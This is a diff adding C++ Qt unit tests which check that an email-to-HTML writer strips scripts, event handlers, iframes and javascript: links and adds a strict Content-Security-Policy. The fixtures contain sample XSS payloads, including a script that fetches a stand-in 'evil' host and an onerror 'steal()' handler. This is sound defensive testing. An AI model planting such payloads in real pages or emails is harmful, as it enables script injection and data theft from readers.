@@ -4,6 +4,7 @@
 /// @file test_html_email_writer.cpp
 /// @brief Unit tests for HtmlEmailWriter styled HTML output
 
+#include "sak/email_html_sanitizer.h"
 #include "sak/email_types.h"
 #include "sak/error_codes.h"
 #include "sak/html_email_writer.h"
@@ -228,6 +229,54 @@ private Q_SLOTS:
         QFile f1(r1.value());
         QVERIFY(f1.open(QIODevice::ReadOnly));
         QVERIFY(f1.readAll().contains("BODY-ONE"));
+    }
+
+    // ====================================================================
+    // B7-05: untrusted email HTML must not carry active content into the
+    // saved page, and the page must ship a strict CSP.
+    // ====================================================================
+
+    void sanitizerStripsActiveContent() {
+        const QString dirty = QStringLiteral(
+            "<p>hi</p>"
+            "<script>fetch('http://evil')</script>"
+            "<img src=x onerror=\"steal()\">"
+            "<iframe src=\"http://evil\"></iframe>"
+            "<a href=\"javascript:evil()\">go</a>");
+        const QString clean = sak::sanitizeEmailBodyHtml(dirty);
+
+        QVERIFY(clean.contains(QStringLiteral("<p>hi</p>")));  // benign markup preserved
+        QVERIFY(!clean.contains(QStringLiteral("<script"), Qt::CaseInsensitive));
+        QVERIFY(!clean.contains(QStringLiteral("onerror"), Qt::CaseInsensitive));
+        QVERIFY(!clean.contains(QStringLiteral("<iframe"), Qt::CaseInsensitive));
+        QVERIFY(!clean.contains(QStringLiteral("javascript:"), Qt::CaseInsensitive));
+    }
+
+    void savedHtmlHasCspAndStripsScript() {
+        QTemporaryDir temp_dir;
+        QVERIFY(temp_dir.isValid());
+        sak::HtmlEmailWriter writer(temp_dir.path(), false, false);
+
+        sak::PstItemDetail item;
+        item.subject = QStringLiteral("Hostile");
+        item.sender_email = QStringLiteral("evil@test.com");
+        item.body_html = QStringLiteral(
+            "<p>Body</p><script>fetch('http://evil')</script>"
+            "<img src=\"http://tracker/beacon.gif\" onerror=\"alert(1)\">");
+        item.date = QDateTime(QDate(2025, 1, 1), QTime(0, 0, 0), QTimeZone::utc());
+
+        auto result = writer.writeMessage(item, {}, QString());
+        QVERIFY(result.has_value());
+
+        QFile file(result.value());
+        QVERIFY(file.open(QIODevice::ReadOnly));
+        const QByteArray content = file.readAll();
+
+        QVERIFY(content.contains("Content-Security-Policy"));
+        QVERIFY(content.contains("default-src 'none'"));
+        QVERIFY(!content.toLower().contains("<script"));
+        QVERIFY(!content.toLower().contains("onerror"));
+        QVERIFY(content.contains("<p>Body</p>"));  // real body still rendered
     }
 };
 
